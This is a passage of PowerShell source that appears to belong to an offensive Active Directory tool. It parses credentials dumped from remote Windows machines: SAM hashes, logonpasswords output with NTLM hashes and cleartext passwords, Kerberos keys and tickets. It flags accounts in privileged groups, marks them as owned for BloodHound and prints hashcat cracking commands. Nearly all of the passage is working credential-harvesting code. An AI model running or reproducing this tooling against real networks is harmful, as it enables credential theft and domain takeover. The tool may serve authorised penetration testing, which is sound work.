                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = ($A + $AA) -band [uint32]::MaxValue
                $B = ($B + $BB) -band [uint32]::MaxValue
                $C = ($C + $CC) -band [uint32]::MaxValue
                $D = ($D + $DD) -band [uint32]::MaxValue
            }

            $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
            $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
            $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
            $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'

            "$A$B$C$D"
        }
    }

    ################################################################################################################
    ################################################## Function: Parse-SAM #########################################
    ################################################################################################################
    function Parse-SAM {

        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }
        
        $SamFull = Test-Path -Path "$PME\SAM\.SAM-Full.txt"
        if (-not $SamFull) {
            New-Item -Path "$PME\SAM\" -Name ".SAM-Full.txt" -ItemType "File" | Out-Null
        }

        $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
        $lines = @{}

        foreach ($file in $files) {
            $fileLines = Get-Content $file

            foreach ($line in $fileLines) {
                if ([string]::IsNullOrWhiteSpace($line)) {
                    continue
                }

                $lineParts = $line -split ':'
                $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
            
                $baseName = $file.BaseName
                $computerOrIP = if ($baseName -match '^(?<ip>\d{1,3}(\.\d{1,3}){3})') {
                    $matches['ip']
                }
                else {
                    $baseName -split '\.' | Select-Object -First 1
                }

                if ($lines.ContainsKey($lineWithoutNumber)) {
                    $lines[$lineWithoutNumber] += "," + $computerOrIP
                }
                else {
                    $lines[$lineWithoutNumber] = $computerOrIP
                }
            }
        }

        $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
        if ($duplicateLines) {
            Write-Host
            Write-Host
            Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
            Write-Host
    
            foreach ($duplicate in $duplicateLines) {
                $line = $duplicate.Key
                [array]$Computers = $duplicate.Value -split ','
        
                Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
                Write-Host "$line::"
                Write-Host
            }
        }

        Write-Host
        Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
        Write-Host

        Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $baseName = $_.BaseName
            $ComputerOrIP = if ($baseName -match '^(?<ip>\d{1,3}(\.\d{1,3}){3})') {
                $matches['ip']
            }
            else {
                $baseName -split '\.' | Select-Object -First 1
            }
            $ComputerFormed = "[{0}]" -f $ComputerOrIP
            $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
            $content = Get-Content $_.FullName -Verbose
            $output = foreach ($line in $content) {
                $trimmedLine = $line.Trim()
                if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt 0) {
                    $ComputerFormed + $trimmedLine
                }
            }
            $output | Out-File "$SAM\.SAM-Full.txt" -Force "ascii" -Append
        }

        Start-Sleep -Seconds 3
    (Get-Content "$SAM\.SAM-Full.txt") | Sort-Object -Unique | Sort-Object | Out-File "$SAM\.SAM-Full.txt" -Encoding "ASCII"
        Get-Content "$SAM\.SAM-Full.txt"

        Write-Host ""
        Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
        Write-Host ""
    
        if ($Rainbow) {
            RainbowCheck -Module "SAM" -RCFilePath "$PME\SAM\.SAM-Full.txt"
        }
    }

    ################################################################################################################
    ################################################# Function: Parse-LogonPassword ################################
    ################################################################################################################
    function Parse-LogonPasswords {

        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }

        Write-Host
        Write-Host
        Write-Host "Parsing Results" -ForegroundColor "Yellow"
        Write-Host
        Start-Sleep -Seconds 1

        if (-not (Test-Path -Path "$LogonPasswords\.AllUniqueNTLM.txt")) { New-Item -Path "$LogonPasswords\.AllUniqueNTLM.txt" -ItemType "File" -Force | Out-Null }

        function Parse-LogonPassword {
            param (
                [string]$raw
            )

            $userInfo = @{}

            function Process-Match {
                param ([string]$match)

                $username = $domain = $NTLM = $password = $null

                foreach ($line in $match.Split("`n")) {
                    switch -Regex ($line) {
                        "Username" {
                            $username = $line.Split(":")[1].Trim()
                        }
                        "Domain" {
                            $domain = $line.Split(":")[1].Trim()
                            $domain = ($domain -split "\.")[0]
                        }
                        "NTLM" {
                            $NTLM = $line.Split(":")[1].Trim()
                        }
                        "Password" {
                            $password = ($line -split ":", 2)[1].Trim()
                        }
                    }
                }

                if ($username -and $username -ne "(null)" -and $domain -and $domain -ne "(null)") {
                    $identity = "$domain\$username"

                    if (-not $userInfo.ContainsKey($identity)) {
                        $userInfo[$identity] = @{}
                    }

                    if ($NTLM) {
                        $userInfo[$identity]["NTLM"] = $NTLM
                    }

                    if ($password -and $password -ne "(null)" -and $password.Length -lt 320) {
                        $userInfo[$identity]["Password"] = $password
                    }
                }
            }

            $patterns = @(
                "(?s)(?<=msv :).*?(?=tspkg :)",
                "(?s)(?<=tspkg :).*?(?=wdigest :)",
                "(?s)(?<=wdigest :).*?(?=kerberos :)",
                "(?s)(?<=kerberos :).*?(?=ssp :)"
            )

            foreach ($pattern in $patterns) {
                $raw | Select-String -Pattern $pattern -AllMatches | ForEach-Object {
                    $_.Matches.Value | ForEach-Object {
                        if ($_ -match "Domain") {
                            Process-Match -match $_
                        }
                    }
                }
            }

            foreach ($identity in $userInfo.Keys) {
                [PSCustomObject]@{
                    Identity = $identity
                    NTLM     = $userInfo[$identity]["NTLM"]
                    Password = $userInfo[$identity]["Password"]
                    Notes    = ""
                }
            }
        }


        $LogonPasswordPath = "$LogonPasswords"
        $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt
        $Searcher = New-Searcher -domain "$Domain"

        foreach ($File in $Files) {
            # Extract computer name (DNS Hostname) from the file name using regex
            $Computer = $File.BaseName -replace "-LogonPasswords$", ""
    
            Write-Host
            Write-Host "-[$Computer]-"
            Write-Host
    
            $FileOutput = Get-Content -Raw -Path $File.FullName
    
            if ($FileOutput -match '\[SYSTEM\]:(.*)') {
                $SYSTEMName = $matches[1].Trim()
            }
    
            $ParsedResults = Parse-LogonPassword -raw $FileOutput
    
            foreach ($user in $ParsedResults) {
                if ($user.Identity -ne $null) {
                    $username = $user.Identity.Split('\')[1]
                    if (AdminCount -UserName $username -Searcher $Searcher) {
                        $user.Notes = "[AdminCount=1] "
                    }
                }
            }
    
            $ParsedResults |
            Where-Object { $_.NTLM -or $_.Password } |
            ForEach-Object {
                $notesAdditions = @()
                New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
                $ComputerDirectory = "$LogonPasswords\$Computer"
        
                $userName = ($_.Identity -split '\\')[1]
                Append-BHQuery -UserName $Username -Domain $Domain
        
                if ($userName -in $DomainAdmins) { 
                    $notesAdditions += "[Domain Admin] " 
                }
                if ($userName -in $EnterpriseAdmins) { 
                    $notesAdditions += "[Enterprise Admin] " 
                }
                if ($userName -in $ServerOperators) { 
                    $notesAdditions += "[Server Operator] " 
                }
                if ($userName -in $AccountOperators) { 
                    $notesAdditions += "[Account Operator] " 
                }
                if ($userName -in $HyperVAdministrators) { 
                    $notesAdditions += "[Hyper-V Administrator] " 
                }
                if ($userName -in $StorageReplicateAdministrators) { 
                    $notesAdditions += "[Storage Replicate Administrator] " 
                }
                if ($userName -in $SchemaAdmins) { 
                    $notesAdditions += "[Schema Admin] " 
                }
                if ($userName -in $KeyAdmins) { 
                    $notesAdditions += "[Key Admin] " 
                }
                if ($userName -in $EnterpriseKeyAdmins) { 
                    $notesAdditions += "[Enterprise Key Admin] " 
                }
                if ($userName -in $DnsAdmins) { 
                    $notesAdditions += "[Dns Admin] " 
                }
                if ($userName -in $DHCPAdministrators) { 
                    $notesAdditions += "[DHCP Administrator] " 
                }
                if ($userName -in $GroupPolicyCreatorOwners) { 
                    $notesAdditions += "[Group Policy Creator Owner] " 
                }
                if ($userName -in $BackupOperators) { 
                    $notesAdditions += "[Backup Operator] " 
                }
                if ($userName -in $CertPublishers) { 
                    $notesAdditions += "[Cert Publisher] " 
                }
                if ($userName -in $PrintOperators) { 
                    $notesAdditions += "[Print Operator] " 
                }
                if ($userName -in $OrganizationManagement) { 
                    $notesAdditions += "[Organization Management] " 
                }
                if ($userName -in $ServerManagement) { 
                    $notesAdditions += "[Server Management] " 
                }


                if ($_.Identity -like "$SYSTEMName\*") { $notesAdditions = "[LOCAL]" }
        
                # Check if NTLM value indicates an empty password
                if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                    $notesAdditions += "[NTLM=Empty Password] "
                }
        
                if ($_.Password -ne $null) {
                    # Extract username from Identity
                    $userName = ($_.Identity -split '\\')[1]
            
                    # Check if username does not end with $
                    if ($userName -notmatch '\$$') {
                        $notesAdditions += "[Cleartext Password] "
                    }
                }
        
                $_.Notes += ($notesAdditions -join ' ')
        
                Write-Host "Username  : $($_.Identity.ToLower())"
                Write-Host "NTLM      : $($_.NTLM)"
        
                if ($Username -notlike "*$*") {
                    Append-BHQuery -UserName $Username -Domain $Domain -RC4 $($_.NTLM) -RC4Property
                    Append-BHQuery -UserName $Username -Domain $Domain -UserOwned
                }
        
                if ($_.Password -ne $null) {
                    Write-Host "Password  : $($_.Password)"
                }
        
                if ($_.Notes -ne "") {
                    Write-Host "Notes     : " -NoNewline
            
                    # Highlight notes in yellow if it contains specific flags
                    if ($_.Notes -match "LOCAL") {
                        Write-Host -ForegroundColor "Yellow"  "[Local Account]"
                    }
                    elseif ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password") {
                        Write-Host -ForegroundColor "Yellow" "$($_.Notes)"
                    }
                    else {
                        Write-Host "$($_.Notes)"
                    }

                }
                Write-Host ""
                    
                # If the user identity contains "$" do nothing, otherwise add the user result to file
                if ($_.Identity -notlike "*$*") { "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force }

        
                Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
            }
        }


        Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort-Object | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
    
        # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
        $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object { $_ -notmatch ":$" }
        $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force

        # Print unique NTLM hashes within the banner
        Write-Host
        Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
        Write-Host
        Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
        Write-Host
        Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
        Write-Host 
        Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
        Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
        Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
        Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
        Write-Host

        if ($Rainbow) {
            RainbowCheck -Module "LogonPasswords" -RCFilePath "$LogonPasswords\.AllUniqueNTLM.txt"
        }
    }

    ################################################################################################################
    ################################################# Function: Parse-eKeys ########################################
    ################################################################################################################
    Function Parse-eKeys {
        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
    
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }

        Write-Host
        Write-Host "Parsing Results" -ForegroundColor "Yellow"
        Write-Host
        Start-Sleep -Seconds 1
        $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

        # Initialize the DirectorySearcher outside of the loop for better performance
        $domainSearcher = New-Searcher

        Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
    
            # Ensure the directory for this computer exists
            # Should probably alter this in the future so we dont wipe over existing data and instead rename it with a timestamp for historical data access
            New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$eKeys\$Computer"
    
            Write-Host
            Write-Host "-[$Computer]-"
            Write-Host

            $filePath = $_.FullName
            $fileContent = Get-Content -Path $filePath -Raw
            Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"

            # Regex for grabbing each "block" of data from output
            $blockPattern = '(?ms)(?i)(authentication id :.*?)(?=authentication id :|\z)'
            $blocks = [regex]::Matches($fileContent, $blockPattern)

            $uniqueGroups = @{}

            foreach ($block in $blocks) {
                $blockText = $block.Value

                # Extract the "User Name" from the block
                # This is essentially the "identifier" for each block. We can use this to skip (potentially) undesirable data blocks
                $userNamePattern = '(?mis)User\s+Name\s*:\s(.+?)\s*\r?\n'
                $userNameMatch = [regex]::Match($blockText, $userNamePattern)
                $BlockUserName = $userNameMatch.Groups[1].Value.Trim()

                # Might be a better idea in the future to consider skipping over particular well known SIDs instead
                if ($BlockUserName -like "DWM-*" -or $BlockUserName -like "UMFD-*") {
                    Write-Log "Skipping block with User Name: $BlockUserName"
                    continue
                }

                # Extract other details within the block
                $pattern = '(?mis)\s[\*\-]\s+Username\s:\s(.+?)\s*\r?\n\s*[\*\-]\s+Domain\s+:\s(.+?)\s*\r?\n\s*[\*\-]\s+Password\s:\s(.+?)\s*\r?\n\s*[\*\-]\s+Key List\s:\s(.*?)(?=\r?\n\s*[\*\-]\s+Username\s:|\r?\n\r?\n)'
                $match = [regex]::Match($blockText, $pattern)

                if ($match.Success) {
                    $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'

                    if (([regex]::Matches($password, ' ')).Count -gt 10) {
                        $password = "(Hex Value: Redacted)"
                    }            
            
                    $domainUsername = "$($domain.ToLower())\$username"
                    $groupKey = $domainUsername

                    if (!$uniqueGroups.ContainsKey($groupKey)) {
                        $notes = ""  # This will store the notes

                        # Check for non-null passwords and username not ending with $
                        if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
                            $notes += "[Cleartext Password] "
                        }


                        # Reminder to self, perform this collection when the script is first run rather than doing this on a per user basis when parsing everytime
                        if (AdminCount -UserName $username -Searcher $domainSearcher) {
                            $notes += "[AdminCount=1] "
                        }

                        # Check for Empty Password hash
                        if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
                            $notes += "[rc4_hmac_nt=Empty Password] "
                        }

                        # Checks for group memberships
                        if ($DomainAdmins -contains $username) {
                            $notes += "[Domain Admin] "
                        }
                        if ($EnterpriseAdmins -contains $username) {
                            $notes += "[Enterprise Admin] "
                        }
                        if ($ServerOperators -contains $username) {
                            $notes += "[Server Operator] "
                        }
                        if ($AccountOperators -contains $username) {
                            $notes += "[Account Operator] "
                        }
                        if ($HyperVAdministrators -contains $username) {
                            $notes += "[Hyper-V Administrator] "
                        }
                        if ($StorageReplicateAdministrators -contains $username) {
                            $notes += "[Storage Replicate Administrator] "
                        }
                        if ($SchemaAdmins -contains $username) {
                            $notes += "[Schema Admin] "
                        }
                        if ($KeyAdmins -contains $username) {
                            $notes += "[Key Admin] "
                        }
                        if ($EnterpriseKeyAdmins -contains $username) {
                            $notes += "[Enterprise Key Admin] "
                        }
                        if ($DnsAdmins -contains $username) {
                            $notes += "[Dns Admin] "
                        }
                        if ($DHCPAdministrators -contains $username) {
                            $notes += "[DHCP Administrator] "
                        }
                        if ($GroupPolicyCreatorOwners -contains $username) {
                            $notes += "[Group Policy Creator Owner] "
                        }
                        if ($BackupOperators -contains $username) {
                            $notes += "[Backup Operator] "
                        }
                        if ($CertPublishers -contains $username) {
                            $notes += "[Cert Publisher] "
                        }
                        if ($PrintOperators -contains $username) {
                            $notes += "[Print Operator] "
                        }
                        if ($OrganizationManagement -contains $username) {
                            $notes += "[Organization Management] "
                        }
                        if ($ServerManagement -contains $username) {
                            $notes += "[Server Management] "
                        }

                        $group = [PSCustomObject]@{
                            DomainUsername = $domainUsername
                            KeyList        = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                            Password       = $password
                            Notes          = $notes
                        }

                        $uniqueGroups[$groupKey] = $group
                        Append-BHQuery -UserName $Username -Domain $Domain

                        Write-Host "Username    : $domainUsername"
                        if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null) {} Else { Write-Host "Password    : $password" }

                        foreach ($key in $group.KeyList) {
                            if (![string]::IsNullOrWhiteSpace($key)) {
                                $keyParts = $key.Trim() -split '\s+'
                                Write-Host "$($keyParts[0].ToLower()) : $($keyParts[1].ToLower())"
                                if ($username -notlike "*$*") {
                                    if ($keyParts[1].length -eq 32) { Append-BHQuery -UserName $Username -Domain $Domain -RC4 $($keyParts[1]) -RC4Property ; Append-BHQuery -UserName $Username -Domain $Domain -UserOwned }
                                    if ($keyParts[1].length -eq 64) { Append-BHQuery -UserName $Username -Domain $Domain -AES256 $($keyParts[1]) -AESProperty ; Append-BHQuery -UserName $Username -Domain $Domain -UserOwned }
                                }
                            }
                        }
                        if (-not [string]::IsNullOrWhiteSpace($notes)) {
                            Write-Host "Notes       : " -NoNewline
                            Write-Host $notes -ForegroundColor "Yellow" -NoNewline
                            Write-Host ""
                        }

                        Write-Host ""
                    }
                }

                # Store the raw block output in the computer's directory
                $blockFilePath = "$ComputerDirectory\$($Computer)_Block_$($BlockUserName).txt"
                Set-Content -Path $blockFilePath -Value $blockText
            }
        }
    }


    ################################################################################################################
    ############################################## Function: Parse-KerbDump ########################################
    ################################################################################################################

    function Parse-KerbDump {

        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        if ($Method -notin $AvailableMethods) { return }
        
        if ($Global:SuccessCount -eq 0) { return }
        
        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-sleep -Seconds "2"

        # Initialize DirectorySearcher
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

        # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
        Get-ChildItem -Path $Tickets -Filter "*KerbDump.txt" | 
        Where-Object { $_.Length -gt 0 } | 
        ForEach-Object {
            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
            
            # Create the following flag to track output later
            $DisplayComputerName = $True

            # Create a directory in the name of the computer from which results are parsed from
            New-Item -ItemType "Directory" -Path $Tickets -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$Tickets\$Computer"

            # Read the file content
            $FileContent = Get-Content -Path $_.FullName -Raw

            # Define regex pattern to match ticket details
            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $data = @{
                    ServiceName    = $match.Groups[1].Value
                    EncryptionType = $match.Groups[2].Value
                    TicketExp      = $match.Groups[3].Value
                    ServerName     = $match.Groups[4].Value
                    UserName       = $match.Groups[5].Value
                    Flags          = $match.Groups[6].Value
                    SessionKeyType = $match.Groups[7].Value
                }

                # Transform the username into a more common format "DOMAIN\Username"
                $userNameParts = $data.UserName -split '@'
                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
                $DomainUserName = $userNameParts[0]

                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
                if ($DomainUserName -match '\$$') { Continue }

                # Initialize notes variable
                $notes = ""

                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
                $PrivilegedUser = $false  

                if ($DomainUserName -in $DomainAdmins) { 
                    $notes += "[Domain Admin] " 
                    $PrivilegedUser = $true
                }
